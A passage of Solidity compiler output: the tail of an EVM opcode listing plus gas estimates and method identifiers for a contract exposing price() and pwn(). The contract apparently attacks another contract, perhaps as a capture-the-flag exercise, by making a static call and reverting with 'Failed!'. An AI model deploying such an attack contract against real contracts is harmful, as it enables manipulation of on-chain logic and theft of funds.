SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1EE JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x212 SWAP2 SWAP1 PUSH2 0x313 JUMP JUMPDEST EQ PUSH2 0x252 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x249 SWAP1 PUSH2 0x398 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x266 DUP2 PUSH2 0x254 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x27F PUSH0 DUP4 ADD DUP5 PUSH2 0x25D JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x29D DUP2 PUSH2 0x289 JUMP JUMPDEST DUP2 EQ PUSH2 0x2A7 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x2B8 DUP2 PUSH2 0x294 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x2D3 JUMPI PUSH2 0x2D2 PUSH2 0x285 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x2E0 DUP5 DUP3 DUP6 ADD PUSH2 0x2AA JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x2F2 DUP2 PUSH2 0x254 JUMP JUMPDEST DUP2 EQ PUSH2 0x2FC JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x30D DUP2 PUSH2 0x2E9 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x328 JUMPI PUSH2 0x327 PUSH2 0x285 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x335 DUP5 DUP3 DUP6 ADD PUSH2 0x2FF JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4661696C65642100000000000000000000000000000000000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x382 PUSH1 0x7 DUP4 PUSH2 0x33E JUMP JUMPDEST SWAP2 POP PUSH2 0x38D DUP3 PUSH2 0x34E JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x3AF DUP2 PUSH2 0x376 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH32 0x54128B234C39320D0A22B118492C4A0A07053FF5680C6540DE05DE6FAA6AF964 PUSH20 0x6F6C634300081C00330000000000000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "200800",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"price()": "infinite",
						"pwn()": "infinite"
					}
				},
				"methodIdentifiers": {
					"price()": "a035b1fe",
					"pwn()": "dd365b8b"
				}
			},
			"storageLayout": {
				"storage": [],
				"types": null
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}